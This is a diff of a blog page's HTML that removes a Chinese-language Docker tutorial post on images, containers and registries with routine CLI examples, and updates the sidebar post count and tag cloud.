-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br><span class="line"></span><br><span class="line"> Labels:</span><br><span class="line"> Experimental: false</span><br><span class="line"> Insecure Registries:</span><br><span class="line">  127.0.0.0/8</span><br><span class="line"> Registry Mirrors:</span><br><span class="line">  https://registry.docker-cn.com/</span><br><span class="line">  http://hub-mirror.c.163.com/</span><br><span class="line">  https://docker.mirrors.ustc.edu.cn/</span><br><span class="line"> Live Restore Enabled: false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看版本信息</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.13</span><br><span class="line"> API version:       1.41</span><br><span class="line"> Go version:        go1.16.15</span><br><span class="line"> Git commit:        a224086</span><br><span class="line"> Built:             Thu Mar 10 14:09:51 2022</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"> Experimental:      true</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>卸载</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line"></span><br><span class="line">docker-client \</span><br><span class="line"></span><br><span class="line">docker-client-latest \</span><br><span class="line"></span><br><span class="line">docker-common \</span><br><span class="line"></span><br><span class="line">docker-latest \</span><br><span class="line"></span><br><span class="line">docker-latest-logrotate \</span><br><span class="line"></span><br><span class="line">docker-logrotate \</span><br><span class="line"></span><br><span class="line">docker-selinux \</span><br><span class="line"></span><br><span class="line">docker-engine-selinux \</span><br><span class="line"></span><br><span class="line">docker-engine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo rm -rf /var/lib/docke</span><br></pre></td></tr></table></figure>
-
-<h2 id="三大组件"><a href="#三大组件" class="headerlink" title="三大组件"></a>三大组件</h2><p><code>镜像(Image)</code>，<code>容器(Container)</code>，<code>仓库(Repository)</code>是我们常说的<code>Docker</code>的三大组件，来自对<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903938030845966">此文章</a>的抄录</p>
-<h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>简单地理解，<code>Docker镜像</code>就是一个<code>Linux</code>的文件系统(<code>Root FileSystem</code>)，这个文件系统里面包含可以运行在<code>Linux内核</code>的程序以及相应的数据。</p>
-<p><strong>谈到这里，我们可能需要先补充一点与<code>Linux</code>操作系统相关的知识：</strong></p>
-<blockquote>
-<p>一般而言， <code>Linux</code>分为两个部分：<code>Linux内核(Linux Kernel)</code>与<code>用户空间</code>，而真正的<code>Linux操作系统</code>，是指<code>Linux内核</code>，我们常用的<code>Ubuntu</code>,<code>Centos</code>等操作系统其实是不同厂商在<code>Linux内核</code>基础上添加自己的软件与工具集(<code>tools</code>)形成的发布版本(<code>Linux Distribution</code>)。</p>
-</blockquote>
-<p>因此，我们也可以把镜像看成是上面所说的<code>用户空间</code>，当<code>Docker</code>通过镜像创建一个容器时，就是将镜像定义好的<code>用户空间</code>作为独立隔离的进程运行在宿主机的<code>Linux内核</code>之上。</p>
-<h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker search hello-word</span><br><span class="line">NAME                                    DESCRIPTION                   STARS     OFFICIAL   AUTOMATED</span><br><span class="line">chenlicn163/hello-word                  hello-word                    0     </span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
-
-<h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><ul>
-<li>拉取镜像可以使用<code>docker image pull</code>，其格式如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>要拉取镜像，需要指定<code>Docker Registry</code>的URL和端口号，默认是<code>Docker Hub</code>，另外还需要指定<code>仓库名</code>和标签，仓库名和标签唯一确定一个镜像，而标签是可能省略，如果省略，则默认使用<code>latest</code>作为标签名，而仓库名则由作者名和软件名组成。</p>
-</li>
-<li><p>比如下面就算拉取hello-word的镜像，整个命令的意思就是：在Docker Hub中拉取最新(last)版本的镜像文件</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker pull hello-world</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">2db29710123e: Pull complete</span><br><span class="line">Digest: sha256:4c5f3db4f8a54eb1e017c385f683a2de6e06f75be442dc32698c9bbe6c861edd</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line">docker.io/library/hello-world:latest</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看镜像 <code>docker images</code>和<code>docker image ls</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker image ls</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    feb5d9fea6a5   5 months ago   13.3kB</span><br></pre></td></tr></table></figure>
-
-<h4 id="导出和导入镜像"><a href="#导出和导入镜像" class="headerlink" title="导出和导入镜像"></a>导出和导入镜像</h4><ul>
-<li>如果想与别人共享某个镜像，除了从镜像服务仓库中<code>pull</code>镜像和把镜像<code>push</code>到仓库上去之外，其实我们还可以将本地构建好的镜像直接导出并保存为文件发送给别人，如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image save -o /tmp/test_image.tar.gz hello-world:latest</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看导出的镜像</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# ll /tmp/ | grep image</span><br><span class="line">-rw------- 1 root root  24064 Mar 17 15:11 test_image.tar.gz</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>而当你拿到别人导出的镜像文件，你可以使用<code>docker load</code>命令把镜像加载到本地的<code>Docker</code>镜像列表中，如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; /tmp/test_image.tar.gz</span><br></pre></td></tr></table></figure>
-
-<h4 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h4><ul>
-<li>常用格式如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi  [option]  IMAGE1,IMAGE2,...IMAGEn</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>可以使用镜像的长id、镜像短id、镜像摘要以及镜像名称来删除镜像，如下删除刚刚拉取的hello-word镜像</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker rmi feb5d9fea6a5</span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:4c5f3db4f8a54eb1e017c385f683a2de6e06f75be442dc32698c9bbe6c861edd</span><br><span class="line">Deleted: sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412</span><br><span class="line">Deleted: sha256:e07ee1baac5fae6a26f30cabfe54a36d3402f96afda318fe0a96cec4ca393359</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>当然我们想要清除本地全部镜像时，可以使用下面的命令，不过一般不建议使用</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rmi $(docker images -qa)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>另外，一般如果镜像已经被使用来创建容器，使用上面的命令删除会报下面的错误，告诉我们该镜像已经被使用，不允许删除。对于已经被用于创建容器的镜像，删除方法有两种，<strong>一种是先把容器删除，再删除镜像</strong>，另一种则只需要在删除镜像的命令中跟一个<code>-f</code>参数便可，如：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rim -f f7302</span><br></pre></td></tr></table></figure>
-
-<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><p>面的例子都是直接使用官方提供的镜像，其实，除了从官方仓库或其他镜像仓库拉取别人构建好的镜像外，我们也可以构建自己的镜像，本次跳过</p>
-<h3 id="容器-Container"><a href="#容器-Container" class="headerlink" title="容器(Container)"></a>容器(Container)</h3><ul>
-<li><p>容器与镜像的关系，就如同面向编程中对象与类之间的关系。<strong>因为容器是通过镜像来创建的，所以必须先有镜像才能创建容器</strong>，而生成的容器是一个独立于宿主机的隔离进程，并且有属于容器自己的网络和命名空间。</p>
-</li>
-<li><p><strong>镜像是只读的，但容器却是可读可写的</strong></p>
-</li>
-</ul>
-<h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><p>有两种，分别为<code>docker run</code>和<code>docker start</code></p>
-<h5 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h5><ul>
-<li>使用docker run命令通过镜像创建一个全新的容器<ul>
-<li>如果镜像（hello-world）本地不存在，会提前去下载，然后再次运行</li>
-<li>运行后会退出，通过<code>docker ps</code> 查看不到，要加个<code>-a</code>，<code>docker ps -a</code></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如容器是一种提供服务的守护进程，那么通常需要开放端口供外部访问，则容器会一直处于运行状态，如</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 nginx</span><br><span class="line"># -p 81:80 将容器内部端口80映射到端口81</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>可以为容器指定一个名称，如：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 80:80 --name mynginx nginx</span><br><span class="line"># --name 后面的myngin就是自定义的容器名字</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>也可以进入到容器中，直接与容器进行交互</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it centos /bin/bash</span><br><span class="line"># -i 表示允许你对容器内的标准输入 (STDIN) 进行交互。</span><br><span class="line"># -t 在新容器内指定一个伪终端或终端</span><br><span class="line"># /bin/bash表示运行容器后要执行的命令</span><br></pre></td></tr></table></figure>
-
-<h5 id="docker-start"><a href="#docker-start" class="headerlink" title="docker start"></a>docker start</h5><p>另外一种则是使用<code>docker start</code>命令重新启动已经停止运行的容器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># container_id表示容器的id</span><br><span class="line">$ docker start container_id</span><br></pre></td></tr></table></figure>
-
-<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><ul>
-<li><p><code>Docker</code>容器运行起来以后，要想进入容器内部可以先通过<code>docker ps</code>命令查看，当前运行的容器信息</p>
-</li>
-<li><p>再通过 <code>docker exec -it ec3d30bff042</code> 命令，其中<code>ec3d30bff042</code>为容器ID <code>docker exec -it ec3d30bff042 /bin/bash</code></p>
-</li>
-</ul>
-<h4 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h4><p>而对于正在运行的容器，也可以通过<code>docker restart</code>命令重新启动，如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker restart container_id</span><br></pre></td></tr></table></figure>
-
-<h4 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h4><ul>
-<li>查看在运行的容器</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看所有容器包括在运行中的和停止的容器</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>比如运行<code>hellword</code>，为什么输入 <code>docker ps </code>不显示出来呢？输入<code>docker ps -a</code> 就显示出来？这里说明一下，这个 <code>hellword</code> 是<code>run</code>一下子它就结束程序了你还想它后台运行啥？如果你还是让它运行，那倒是也可以，写一个死循环就可以咯！</p>
-</li>
-<li><p>有时候，我们只想查到容器的id,可以用下面的命令：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure>
-
-<h4 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h4><ul>
-<li>对于已经不需要的容器，可以使用<code>docker stop</code>命令停止其运行，如：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop container_id1，container_id2...</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>批量停止容器，如：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop $(docker ps -qa)</span><br></pre></td></tr></table></figure>
-
-<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><ul>
-<li>指定容器id进行删除</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># container_id表示容器id，通过docker ps可以看到容器id</span><br><span class="line">$ docker rm container_id</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>当我们需要批量删除所有容器，可以用下面的命令：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 删除所有容器</span><br><span class="line">docker rm $(docker ps -a -q)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>删除所有退出的容器，这样执行后，刚刚执行的helloword容器用<code>docker ps -a</code>就查不到了</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure>
-
-<h4 id="导出容器为镜像"><a href="#导出容器为镜像" class="headerlink" title="导出容器为镜像"></a>导出容器为镜像</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker export -o ./image.tar.gz f4f184f5ffb9</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将容器导出后，我们可以另外一台有安装<code>Docker</code>的电脑中将文件包导入成为镜像，如：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker import image.tar.gz</span><br></pre></td></tr></table></figure>
-
-<h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><p>仓库(<code>Repository</code>)是集中存储镜像的地方，这里有个概念要区分一下，那就是仓库与仓库服务器(<code>Registry</code>)是两回事，像我们上面说的<code>Docker Hub</code>，就是<code>Docker</code>官方提供的一个仓库服务器，不过其实有时候我们不太需要太过区分这两个概念。</p>
-<h4 id="公共仓库"><a href="#公共仓库" class="headerlink" title="公共仓库"></a>公共仓库</h4><ul>
-<li><p>公共仓库一般是指<code>Docker Hub</code>，前面我们已经多次介绍如何从<code>Docker Hub</code>获取镜像，除了获取镜像外，我们也可以将自己构建的镜像存放到<code>Docker Hub</code>，这样，别人也可以使用我们构建的镜像。</p>
-</li>
-<li><p>不过要将镜像上传到<code>Docker Hub</code>，必须先在<code>Docker</code>的官方网站上注册一个账号，注册好了之后，可以在本地使用命令登录到<code>Dokcer Hub</code>了，过程如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker login</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>在输入账号密码登录到<code>Docker Hub</code>之后，便可以使用<code>docker push</code>命令把镜像推送到<code>Docker Hub</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker push test:1.0</span><br></pre></td></tr></table></figure>
-
-<h4 id="私有仓库"><a href="#私有仓库" class="headerlink" title="私有仓库"></a>私有仓库</h4><ul>
-<li><p>有时候自己部门内部有一些镜像要共享时，如果直接导出镜像拿给别人又比较麻烦，使用像<code>Docker Hub</code>这样的公共仓库又不是很方便，这时候我们可以自己搭建属于自己的私有仓库服务，用于存储和分布我们的镜像。</p>
-</li>
-<li><p><code>Docker</code>官方提供了<code>registry</code>这个镜像，可以用于搭建私有仓库服务，我们把镜像拉到本地之后，用下面命令创建该镜像的容器便可以搭建一个仓库服务，如下：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 5000:5000 --restart=always --name registry registry</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>假设我们把一台IP为<code>192.168.0.100</code>的服务器作为仓库服务，并运行上面的语句，那么我们可以下面的语句重新构建上面的镜像，如：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t &quot;192.168.0.100/hello-go:1.0&quot; .</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>然后使用下面的语句推送到自己的私有仓库服务器：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker push 192.168.0.100/hello-word:1.0</span><br></pre></td></tr></table></figure>
-
-<h2 id="Docker的组成与架构"><a href="#Docker的组成与架构" class="headerlink" title="Docker的组成与架构"></a>Docker的组成与架构</h2><ul>
-<li>在安装好并启动了<code>Docker</code>之后，我们可以使用在命令行中使用<code>docker</code>命令操作docker，比如我们使用如下命令打印<code>docker</code>的版本信息。</li>
-</ul>
-<p><img src="/aposts/327177db/image-20220317165337772.png" alt="image-20220317165337772"></p>
-<ul>
-<li><p>从上面的图中，我们看到打出了两个部分的信息：<code>Client</code>和<code>Server</code></p>
-</li>
-<li><p>这是因为<code>Docker</code>跟大部分服务端软件一样(如<code>MySQL</code>)，都是使用<code>C/S</code>的架构模型，也就是通过客户端调用服务器，只是我们现在刚好服务端和客户端都在同一台机器上而已。</p>
-</li>
-<li><p>因此，我们可以使用下面的图来表示<code>Docker</code>的架构，<code>DOCKER_HOST</code>是<code>Docker server</code>，而Clinet便是我们在命令中使用<code>docker</code>命令。</p>
-<p><img src="/aposts/327177db/image-20220317165825026.png" alt="image-20220317165825026"></p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2155,7 +2173,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-count">147</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2193,7 +2211,7 @@
     <!--<h3 class="widget-title">Tag Cloud</h3> -->
     <div id="myCanvasContainer" class="widget tagcloud">
         <canvas width="250" height="250" id="resCanvas" style="width=100%">
-            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWVS/" rel="tag">AWVS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burp-Site/" rel="tag">Burp Site</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dependency-Check/" rel="tag">Dependency-Check</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/H5/" rel="tag">H5</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hadoop/" rel="tag">Hadoop</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hive/" rel="tag">Hive</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nessus/" rel="tag">Nessus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sonic/" rel="tag">Sonic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/airtest/" rel="tag">airtest</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/" rel="tag">android性能测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag">app安全测试</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/aritest/" rel="tag">aritest</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos/" rel="tag">centos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome/" rel="tag">chrome</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/datax/" rel="tag">datax</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/drozer/" rel="tag">drozer</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fisco-bcos/" rel="tag">fisco-bcos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flink/" rel="tag">flink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gin/" rel="tag">gin</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/" rel="tag">go</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go-zero/" rel="tag">go-zero</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hive/" rel="tag">hive</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/httprunner/" rel="tag">httprunner</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jmeter/" rel="tag">jmeter</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/" rel="tag">kafka</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kail/" rel="tag">kail</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode-%E6%95%B0%E7%BB%84/" rel="tag">leetcode-数组</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mitmproxy/" rel="tag">mitmproxy</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/" rel="tag">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/monkey/" rel="tag">monkey</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pandas/" rel="tag">pandas</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pc%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag">pc自动化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/playwright/" rel="tag">playwright</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pytest/" rel="tag">pytest</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">23</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selenium/" rel="tag">selenium</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlite/" rel="tag">sqlite</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tkinter/" rel="tag">tkinter</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue/" rel="tag">vue</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue3/" rel="tag">vue3</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">云服务器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/" rel="tag">大数据</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag">安全测试</a><span 